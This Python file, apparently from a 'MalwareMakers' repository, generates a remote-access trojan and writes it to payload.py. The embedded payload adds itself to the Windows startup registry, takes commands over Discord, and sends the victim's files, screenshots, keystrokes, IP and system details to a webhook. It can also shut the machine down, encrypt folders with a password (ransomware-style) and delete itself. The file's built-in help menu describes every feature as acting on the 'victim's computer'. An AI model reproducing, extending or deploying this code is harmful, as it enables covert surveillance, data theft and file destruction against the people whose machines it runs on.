# Made by MalwareMakers 
# Github : https://github.com/MalwareMakers

import logging
from rich.logging import RichHandler
from src.file_encoder import *

FORMAT = "%(message)s"

logging.basicConfig(
    level="NOTSET",format=FORMAT,datefmt="[%X]", handlers=[RichHandler()]
)

log = logging.getLogger('rich')

class System_Gen:
    def __init__(self, token,server_id):
        self.token = token
        self.Server_id = server_id

    def Make_payload(self):
        log.info("Begining Payload Creation!")
        try:
            code = r'''
# Made By MalwareMakers
# Github : https://github.com/MalwareMakers

import os
import requests
import time
import threading
import datetime
from PIL import ImageGrab
import queue
from pynput import keyboard
import concurrent.futures
import sys
import psutil
import json
import winreg as reg

class hi: 
    def __init__(self):
        self.reg_name = reg_name

    def adding(self):
        script_path = os.path.abspath(sys.argv[0])

        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_data = f'"{sys.executable}" "{script_path}"'

        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, self.reg_name, 0, reg.REG_SZ, value_data)
            reg.CloseKey(key)
            print("Script added to Windows startup.")
        except Exception as e:
            print("Error adding script to Windows startup:", e)


class System_gen: 
    def __init__(self):
        self.Token = Token
        self.Server_id = Server_id
    def create_channel_webhook(self):
        user = os.getlogin()
        headers = {
            'Authorization': f'Bot {self.Token}',
            'Content-Type': 'application/json'
        }

        channel_name = f"{user}-channel"
        webhook_name = f"{user}-webhook"
        url = f'https://discord.com/api/v10/guilds/{str(self.Server_id)}/channels'
        print(url)
        response = requests.get(url, headers=headers)
        channels = response.json()
        print(channels)
        existing_channel = next((channel for channel in channels if channel['name'] == channel_name), None)

        if existing_channel:
            response = requests.get(f'https://discord.com/api/v10/channels/{existing_channel["id"]}/webhooks', headers=headers)
            webhooks = response.json()
            existing_webhook = next((webhook for webhook in webhooks if webhook['name'] == webhook_name), None)

            if existing_webhook:
                webhook_url = existing_webhook['url']
                channel_id = existing_channel['id']
                return webhook_url, channel_id

        payload = {
            'name': channel_name,
            'type': 0
        }
        response = requests.post(f'https://discord.com/api/v10/guilds/{self.Server_id}/channels', json=payload, headers=headers)
        new_channel = response.json()

        payload = {
            'name': webhook_name
        }
        response = requests.post(f'https://discord.com/api/v10/channels/{new_channel["id"]}/webhooks', json=payload, headers=headers)
        new_webhook = response.json()

        webhook_url = new_webhook['url']
        channel_id = new_channel['id']

        return webhook_url, channel_id


class Messages: 
    def __init__(self,Channel_id): 
        self.Token = Token
        self.Channel = Channel_id
    def get_latest_command_message(self):
        url = f'https://discord.com/api/v10/channels/{str(self.Channel)}/messages'
        headers = {'Authorization': f'Bot {self.Token}'}

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            try:
                messages = response.json()
                latest_command_message = next((message for message in messages if message['content'].startswith('/')), None)
                return latest_command_message
            except Exception as e:
                print(f"Failed to parse JSON response: {e}")
                return None
        elif response.status_code == 429:
            retry_after = response.json().get('retry_after', 1) / 1000
            print(f"Rate limit exceeded - waiting for {retry_after} seconds")
            time.sleep(retry_after)
            return None
        else:
            print(f"Failed to fetch messages. Status code: {response.status_code}")
            print(response.json())
        return None

class Mass_Upload:
    def __init__(self,webhook_url):
        self.webhook_url = webhook_url
    def massupload(self):
        WEBHOOK_URL = self.webhook_url
    
        BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
        def check_file(file_path):
            allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif','.mp4','.mp3','.py','.js','.mkv','.docx','.xls']
            max_size_mb = 25
            if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
                print(f"Skipping file {file_path} - invalid file type")
                return False
            elif os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
                print(f"Skipping file {file_path} - file size too large")
                return False
            elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
                print(f"Skipping file {file_path} - file requires admin privileges")
                return False
            elif any(blacklisted_dir in file_path for blacklisted_dir in BLACKLISTED_DIRS):
                print(f"Skipping file {file_path} - in blacklisted directory")
                return False
            else:
                return True    
        def upload_file(file_path):
            try:
                with open(file_path, "rb") as f:
                    files = {"file": f}
                    headers = {"User-Agent": "Mozilla/5.0"} 
                    response = requests.post(WEBHOOK_URL, headers=headers, files=files)
                    if response.status_code == 429:
                        
                        print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                        time.sleep(response.json()["retry_after"]/1000)
                        upload_file(file_path)
                    elif response.status_code != 200:
                        msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=headers,payload=None,message=str(response),is_msg=False)
                        msg_instance.msg()
                    else:
                        print(f"Successfully uploaded file {file_path}")
            except Exception as e:
                print(f"Failed to upload file {file_path} - {str(e)}")
        def search_files(root_dir):
            for root, dirs, files in os.walk(root_dir):
                if any(blacklisted_dir in root for blacklisted_dir in BLACKLISTED_DIRS):
                    
                    continue
                for file in files:
                    file_path = os.path.join(root, file)
                    if check_file(file_path):
                        upload_file(file_path)
        def thread_files(root_dirs):
            for root_dir in root_dirs:
                search_files(root_dir)
    
        drives = ["%s:\\" % d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists("%s:" % d)]
        drive_groups = [drives[i:i+4] for i in range(0, len(drives), 4)]

        for group in drive_groups:
            threads = []
            for drive in group:
                thread = threading.Thread(target=search_files, args=(drive,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

class Upload_files: 
    def __init__(self, file_path, webhook_url):
        self.file_path = file_path
        self.webhook_url = webhook_url

    def webhook_upload(self):
        try:
            with open(self.file_path, 'rb') as file:
                files = {'file': (self.file_path, file)}
                headers = {"User-Agent": "Mozilla/5.0"}
                response = requests.post(self.webhook_url, headers=headers, files=files)
                if response.status_code == 429:
                    print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                    time.sleep(response.json()["retry_after"] / 1000)
                    self.webhook_upload()
                elif response.status_code != 200:
                    print(f"Failed to upload file {self.file_path} - error {response.status_code}")
                else:
                    print(f"Successfully uploaded file {self.file_path}")
        except Exception as e:
            
            print(f"Failed to upload file {self.file_path} - {str(e)}")

class Screen_Update: 
    def __init__(self,output_folder,webhook_url):
        self.webhook_url = webhook_url
        self.output_folder = output_folder
    def take_screenshot(self):
        if not os.path.exists(self.output_folder):
            os.makedirs(self.output_folder)
        timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        screenshot = ImageGrab.grab()
        screenshot_filename = os.path.join(output_folder, f'screenshot_{timestamp}.png')
        screenshot.save(screenshot_filename)
        print(f'Screenshot saved as "{screenshot_filename}"')
        upload_files_instance = Upload_files(screenshot_filename,self.webhook_url)
        upload_files_instance.webhook_upload()
        if os.path.exists(screenshot_filename):
            os.remove(screenshot_filename)


class Ip_Api_Info: 
    def __init__(self,webhook_url):
        self.webhook_url = webhook_url
    def basic_info_network(self): 
        response = requests.get('http://icanhazip.com')
        ip = response.text.strip()
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()

        embed = {
            "title": "Quick IP Info",
            "color": 0x00FF00,
            "fields": [
                {
                    "name": "IP Address",
                    "value": ip if ip else "Unknown",
                    "inline": True
                },
                {
                    "name": "Location",
                    "value": f"{info['city']}, {info['regionName']}, {info['country']}",
                    "inline": True
                },
                {
                    "name": "ISP",
                    "value": info['isp'] if info['isp'] else "Unknown",
                    "inline": True
                },
                {
                    "name": "AS Number",
                    "value": info['as'] if info['as'] else "Unknown",
                    "inline": True
                },
                {
                    "name": "ASN Name",
                    "value": info['asname'] if info['asname'] else "Unknown",
                    "inline": True
                },
                {
                    "name": "ORG",
                    "value": info['org'] if info['org'] else "Unknown",
                    "inline": True
                },
                {
                    "name": "Reverse DNS",
                    "value": info['reverse'] if info['reverse'] else "Unknown",
                    "inline": True
                },
                {
                    "name": "Mobile",
                    "value": str(info['mobile']) if 'mobile' in info else "Unknown",
                    "inline": True
                },
                {
                    "name": "Proxy",
                    "value": str(info['proxy']) if 'proxy' in info else "Unknown",
                    "inline": True
                },
                {
                    "name": "Hosting",
                    "value": str(info['hosting']) if 'hosting' in info else "Unknown",
                    "inline": True
                }
            ]
        }

        payload = {
            "username": "IP_API Info Grabber",
            "content": "Quick IP Info",
            "embeds": [embed]
        }

        headers = {"User-Agent": "Mozilla/5.0"}
        msg_instance = System_Messages(webhook_url=self.webhook_url,error=False,headers=headers,payload=payload,message=None,is_msg=False)
        msg_instance.msg()

class System_Messages:
    def __init__(self,webhook_url,message,error,payload,headers,is_msg): 
        self.webhook_url = webhook_url
        self.message = message
        self.error = error 
        self.payload = payload
        self.headers = headers
        self.is_msg = is_msg

    def msg(self):
        try: 
            if self.error == True:
                self.payload = {
                    "content": f"Error! {self.message}"
                }
                self.headers = {
                    "Content-Type": "application/json"
                }
            else:
                if self.msg == True:
                    self.payload = {
                        "content": self.message
                    }
                    self.headers = {
                        "Content-Type": "application/json"
                    }
                response = requests.post(self.webhook_url, json=self.payload, headers=self.headers)
                
                if response.status_code == 204:
                    print("Message sent successfully")
                elif response.status_code == 409: 
                    print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                    time.sleep(response.json()["retry_after"]/1000)
                    self.msg()
                else:
                    print(f"Failed to send message - HTTP status code: {response.status_code}")
        except Exception as e:
            print(f"An error occurred: {str(e)}")

class Logger:
    def __init__(self,webhook_url):
        self.webhook_url = webhook_url
    def key_logger(self):
        keystroke_queue = queue.Queue()
        def send_requests():
            keystrokes = []
            while True:
                try:
                    keystroke = keystroke_queue.get()
                    if hasattr(keystroke, 'char'):
                        keystrokes.append(keystroke.char)
                    elif hasattr(keystroke, 'name'):
                        keystrokes.append('<{}>'.format(keystroke.name))
                        if keystroke.name == 'space':
                            headers = {"User-Agent": "Mozilla/5.0"}
                            payload= {
                                        "username": "Keylogger",
                                        "content": ''.join(keystrokes)
                                    }
                            response = requests.post(self.webhook_url,headers=headers,json=payload)
                            if response.status_code == 200 or response.status_code == 204:
                                keystrokes = []
                            elif response.status_code == 429:
                                time.sleep(response.json()["retry_after"]/1000)
                                response = requests.post(self.webhook_url,headers=headers,json=payload)
                            else:
                                break
                    else:
                        continue
                except Exception as e:
                    print('Error sending request:', e)

        threading.Thread(target=send_requests, daemon=True).start()

        def on_press(key):
            try:
                
                keystroke_queue.put(key)
            except Exception as e:
                print('Error handling keystroke:', e)

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

class Hunter:
    def __init__(self, filename, webhook_url):
        self.filename = filename
        self.webhook_url = webhook_url
    
    def hunt_file(self):
        search_path = '/'
        case_sensitive = True 
        filename_file = self.filename.lower() if not case_sensitive else self.filename
        
        def search_in_directory(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_check = file.lower() if not case_sensitive else file

                    if file_check == filename_file:
                        return os.path.abspath(os.path.join(root, file))
            return None

        with concurrent.futures.ThreadPoolExecutor() as executor:
            drives = ['%s:/' % d for d in range(65, 91) if os.path.exists('%s:/' % chr(d))]

            search_tasks = [executor.submit(search_in_directory, os.path.join(drive, search_path)) for drive in drives]

            for task in concurrent.futures.as_completed(search_tasks):
                result = task.result()
                if result:
                    upload_files_instance = Upload_files(result, self.webhook_url)
                    upload_files_instance.webhook_upload()

        return None

class Self_Kill:
    def __init__(self):
        pass
    def delete_self():
        try:
            script_path = os.path.abspath(sys.argv[0])
            os.remove(script_path)
            print(f"Self-deletion successful. The file '{script_path}' has been deleted.")
        except Exception as e:
            print(f"Failed to delete the script: {e}")

class System_Info:
    def __init__(self,webhook_url):
        self.webhook_url = webhook_url

    def sys_info(self): 
        def get_cpu_info():
            cpu_info = {
                "Physical Cores": psutil.cpu_count(logical=False),
                "Total Cores": psutil.cpu_count(logical=True),
                "Max Frequency": psutil.cpu_freq().max,
                "Min Frequency": psutil.cpu_freq().min,
                "Current Frequency": psutil.cpu_freq().current,
                "CPU Usage": psutil.cpu_percent(interval=1)
            }
            return cpu_info

        def get_memory_info():
            memory = psutil.virtual_memory()
            memory_info = {
                "Total Memory": memory.total,
                "Available Memory": memory.available,
                "Used Memory": memory.used,
                "Free Memory": memory.free,
                "Memory Percentage": memory.percent
            }
            return memory_info

        def get_disk_info():
            partitions = psutil.disk_partitions()
            disk_info = {}
            for partition in partitions:
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    disk_info[partition.device] = {
                        "Total Size": partition_usage.total,
                        "Used": partition_usage.used,
                        "Free": partition_usage.free,
                        "Percentage Used": partition_usage.percent
                    }
                except PermissionError:
                    continue
            return disk_info

        def get_network_info():
            network_info = psutil.net_if_addrs()
            return network_info

        def send_to_discord_webhook(webhook_url, system_specs):
            headers = {'Content-Type': 'application/json'}
            payload = {'content': system_specs}
            
            try:
                response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
                response.raise_for_status()
            except requests.exceptions.RequestException as e:
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=False,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

        
        cpu_info = get_cpu_info()
        memory_info = get_memory_info()
        disk_info = get_disk_info()
        network_info = get_network_info()

        system_specs_str = "```"
        system_specs_str += "CPU Information:\n"
        for key, value in cpu_info.items():
            system_specs_str += f"{key}: {value}\n"

        system_specs_str += "\nMemory Information:\n"
        for key, value in memory_info.items():
            system_specs_str += f"{key}: {value}\n"

        system_specs_str += "\nDisk Information:\n"
        for device, specs in disk_info.items():
            system_specs_str += f"Device: {device}\n"
            for key, value in specs.items():
                system_specs_str += f"{key}: {value}\n"

        system_specs_str += "\nNetwork Information:\n"
        for interface, addresses in network_info.items():
            system_specs_str += f"Interface: {interface}\n"
            for addr in addresses:
                system_specs_str += f"  {addr.family.name}: {addr.address}\n"

        system_specs_str += "```"

        send_to_discord_webhook(self.webhook_url, system_specs_str)

class Help:
    def __init__(self,webhook_url):
        self.webhook_url = webhook_url

    def send_help(self): 
        embed = {
            "title": "Commands",
            "colour": 0x00FF00,
            "fields": [
                {
                    "name": "/mass-upload",
                    "value": "Uploads all files from a victims computer",
                    "inline": True

                }, 
                {
                    "name": "/screen-update",
                    "value": "sends screenshot of victims screen",
                    "inline": True
                },
                {
                    "name": "/quick-info",
                    "value": "gathers info based on ip-api",
                    "inline": True
                },
                {
                    "name":"/shutdown",
                    "value":"shutsdown victims computer",
                    "inline": True
                },
                {
                    "name": "/keylogger",
                    "value": "a keylogger (once started - does not stop till victims computer has been shutdown and turned back on, or restarted)",
                    "inline": True
                },
                {
                    "name":"/hunt",
                    "value": "finds specified files u set and if found uploads them, ie: '/hunt example.docx'",
                    "inline": True
                },
                {
                    "name":"/kill",
                    "value": "attampts to selfdestruct program - warning: If the porgram is placed in a folder or location protected by admin privledges  - this will not work.",
                    "inline": True
                },
                {
                    "name": "/system-info",
                    "value": "shows info about the victims pc",
                    "inline": True
                },
                {
                    "name": "/help",
                    "value": "Brings up this menu of options",
                    "inline": True
                },
                {
                    "name": "/encrypt",
                    "value": r'encrypts specified directory on victims computer with a password u specify, ie: /encrypt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag.',
                    "inline": True
                },
                {
                    "name": "/decrypt",
                    "value": r'decrypts an encrypted folder (you would have had to have done this before) specified directory on victims computer with a password u specified when encrypting, ie: /decyrpt -p 12345 -f "C:\Users\<USERNAME>\Desktop", -p is the password flag, -f is the directory flag."',
                    "inline": True 
                },
                {
                    "name": "/tree",
                    "value": r'This will create a directory tree of a given file path you specify , ie: /tree -f "C:" this will create a directory tree of all directories found in the C Drive',
                    "inline": True
                },

            ]
        }
        payload = {
            "username": "Help Menu",
            "content": "Commands to be used",
            "embeds": [embed]
        }

        headers = {"User-Agent": "Mozilla/5.0"}
        msg_instance = System_Messages(webhook_url=self.webhook_url,error=False,headers=headers,payload=payload,message=None,is_msg=False)
        msg_instance.msg()


    
class Parser: 
    def __init__(self,command_line,func,webhook_url):
        self.command_line = command_line
        self.func = func
        self.webhook_url = webhook_url

    def parse_input(self):
        if self.func.lower() == "tree": 
            index_f = self.command_line.find('-f')
            if  index_f != -1:
                file_location_start = index_f + 3
            if self.command_line[file_location_start] == '"':
                file_location_start += 1
                file_location_end = self.command_line.find('"', file_location_start)
            else:
                file_location_end = self.command_line.find(' ', file_location_start)

            file_location = self.command_line[file_location_start:file_location_end]
            try: 
                directory_tree = Crawler(webhook_url=self.webhook_url,root_dir=file_location)
                directory_tree.directory_tree()
            except Exception as e: 
                print(e)
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

        
        if self.func.lower() == "encrypt" or self.func.lower() == "decrypt":
            index_p = self.command_line.find('-p')
            index_f = self.command_line.find('-f')
            if index_p != -1 and index_f != -1:

                password_start = index_p + 3
                password_end = self.command_line.find(' ', password_start)
                password = self.command_line[password_start:password_end]

                file_location_start = index_f + 3
                if self.command_line[file_location_start] == '"':
                    file_location_start += 1
                    file_location_end = self.command_line.find('"', file_location_start)
                else:
                    file_location_end = self.command_line.find(' ', file_location_start)

                file_location = self.command_line[file_location_start:file_location_end]

            if self.func.lower() == "encrypt":
                try:
                    encryption = Encrypter(password=password, file_location = file_location, webhook_url=self.webhook_url)
                    encryption.encryption()
                except Exception as e: 
                    msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                    msg_instance.msg()
            elif self.func.lower() == "decrypt":
                try:
                    decryption = Decrypter(password=password, file_location=file_location, webhook_url=self.webhook_url)
                    decryption.decryption()
                except Exception as e: 
                    msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                    msg_instance.msg()
            
        else: 
            return None

class Encrypter: 
    def __init__(self,password,file_location,webhook_url):
        self.pwd = password
        self.path = file_location
        self.webhook_url = webhook_url

    def encryption(self): 
        def xor_cipher(data, key):
            return bytes(b ^ key for b in data)

        def generate_key(password):
            key = 0
            for char in password:
                key ^= ord(char)
            return key
        
        def encrypt_file(file_path, password):
            try: 
                with open(file_path, 'rb') as file:
                    data = file.read()
            except Exception as e: 
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

            key = generate_key(password)
            encrypted_data = xor_cipher(data, key)

            encrypted_file_path = file_path + '.encrypted'

            try:
                with open(encrypted_file_path, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted_data)
            except Exception as e: 
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()
            try:
                os.remove(file_path)
            except Exception as e: 
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

        def encrypt_folder(path, pwd):
            for root, _, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path, pwd)

        encrypt_folder(self.path,self.pwd)
        message = f"Sucessfully Encrypted Path: {self.path}"
        msg_instance = System_Messages(webhook_url=self.webhook_url,error=False,headers=None,payload=None,message=message,is_msg=True)
        msg_instance.msg()

class Decrypter:
    def __init__(self,password,file_location,webhook_url): 
        self.pwd = password
        self.path = file_location
        self.webhook_url = webhook_url

    def decryption(self): 
        def xor_cipher(data, key):
            return bytes(b ^ key for b in data)

        def generate_key(password):
            key = 0
            for char in password:
                key ^= ord(char)
            return key

        def decrypt_file(encrypted_file_path, password):
            try:
                with open(encrypted_file_path, 'rb') as encrypted_file:
                    data = encrypted_file.read()
            except Exception as e:
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

            key = generate_key(password)
            decrypted_data = xor_cipher(data, key)

            decrypted_file_path = encrypted_file_path[:-10]

            try:
                with open(decrypted_file_path, 'wb') as decrypted_file:
                    decrypted_file.write(decrypted_data)
            except Exception as e:
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

            try:
                os.remove(encrypted_file_path)
            except Exception as e:
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

        def decrypt_folder(path, pwd):
            for root, _, files in os.walk(path):
                for file in files:
                    if file.endswith('.encrypted'):
                        file_path = os.path.join(root, file)
                        decrypt_file(file_path, pwd)
        
        decrypt_folder(self.path,self.pwd)
        message = f"Sucessfully Decrypted Path: {self.path}"
        msg_instance = System_Messages(webhook_url=self.webhook_url,error=False,headers=None,payload=None,message=message,is_msg=True)
        msg_instance.msg()

class Crawler: 
    def __init__(self,webhook_url,root_dir):
        self.webhook_url = webhook_url
        self.root_dir = root_dir

    def directory_tree(self):
        def write_directory_structure(path, indent=0, output_file=None):
            try:
                output_file.write('  ' * indent + os.path.basename(path) + '\n')
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if os.path.isdir(item_path):
                        write_directory_structure(item_path, indent+1, output_file)
            except PermissionError:
                output_file.write('  ' * indent + f"Permission denied: {os.path.basename(path)}\n")
        dir = r'C:\ProgramData\WindowsSecurity\structure.txt'        
        print(dir)
        try: 
            os.makedirs(os.path.dirname(dir), exist_ok=True)
            with open(dir, 'w', encoding='utf-8') as f:
                write_directory_structure(path=self.root_dir, output_file=f)
        except Exception as e:
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

        upload_files_instance = Upload_files(dir,self.webhook_url)
        upload_files_instance.webhook_upload()

        if os.path.exists(dir):
            try: 
                os.remove(dir)
            except Exception as e: 
                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                msg_instance.msg()

                
class Process: 
    def __init__(self,command,webhook_url):
        self.command = command
        self.webhook_url = webhook_url 
        self.output_folder = output_folder
    def process_command(self):
        command_breakdown = self.command.split()
        
        if command_breakdown[0].lower() == "mass-upload":
            mass_upload_instance = Mass_Upload(self.webhook_url)
            mass_upload_instance.massupload()
        
        if command_breakdown[0].lower() == "screen-update": 
            screen_update_instance = Screen_Update(self.output_folder, self.webhook_url)
            screen_update_instance.take_screenshot()

        if command_breakdown[0].lower() == "quick-info": 
            ip_info_instance = Ip_Api_Info(self.webhook_url)
            ip_info_instance.basic_info_network()

        if command_breakdown[0].lower() == "shutdown":
            os.system("shutdown /s /t 1")    
        
        if command_breakdown[0].lower() == "keylogger": 
            keylogger_instance = Logger(self.webhook_url)
            keylogger_instance.key_logger()

        if command_breakdown[0].lower() == "hunt": 
            command_breakdown.remove(command_breakdown[0])
            hunted_file = ' '.join(command_breakdown)
            hunt_file = Hunter(hunted_file,self.webhook_url)
            hunt_file.hunt_file()

        if command_breakdown[0].lower() == "kill":
            delete_self = Self_Kill()
            delete_self.delete_self()

        if command_breakdown[0].lower() == "system-info":
            sys_info=System_Info(self.webhook_url)
            sys_info.sys_info()
        
        if command_breakdown[0].lower() == "help": 
            send_help = Help(self.webhook_url)
            send_help.send_help()
        
        if command_breakdown[0].lower() == "encrypt":
            command_line = rf'{self.command}'
            func = "encrypt"
            parse_input = Parser(command_line=command_line,func=func,webhook_url=self.webhook_url)
            parse_input.parse_input()

        if command_breakdown[0].lower() == "decrypt":
            command_line = rf'{self.command}'
            func = "decrypt"
            parse_input = Parser(command_line=command_line,func=func,webhook_url=self.webhook_url)
            parse_input.parse_input()

        if command_breakdown[0].lower() == "tree":
            command_line = rf'{self.command}'
            func = 'tree'
            parse_input = Parser(command_line=command_line,func=func,webhook_url=self.webhook_url)
            parse_input.parse_input()


            '''
            code2 = r'''
Token = "{}"
Server_id = "{}"
reg_name = "WindowsSecurity"
output_folder = "/Documents/zeon/hunter/doom/regular"

persistence_instance = hi()
system_gen_instance = System_gen()


def main():
    last_message_id = None
    persistence_instance.adding()
    webhook,channel_id = system_gen_instance.create_channel_webhook()
    messages_instance = Messages(channel_id)
    while True: 
        latest_msg = messages_instance.get_latest_command_message()
        time.sleep(3)
        if latest_msg and latest_msg['id'] != last_message_id:
            last_message_id = latest_msg['id']
            command = latest_msg['content'][1:]
            process_instance = Process(command=command,webhook_url=webhook)
            process_instance.process_command()

main()'''.format(self.token,self.Server_id)
            total = code + code2
            file_gen = File_encoder(code=total, type1 = "payload")
            script = file_gen.File_encoder()
        except Exception as e:
            log.critical(f"Generation Of Payload failed!")
            print(f"{str(e)}")

        log.info("Payload Generation Complete!")
        log.info("Begining To write Payload to file!")
        try:
            name = 'payload.py'
            with open(name, 'w') as f: 
                f.writelines(script)
            log.info("Payload file Creation complete!")
        except Exception as e: 
            log.critical(f"Writing to file has had an error!")
            print(f"{str(e)}")
        

        return True, name
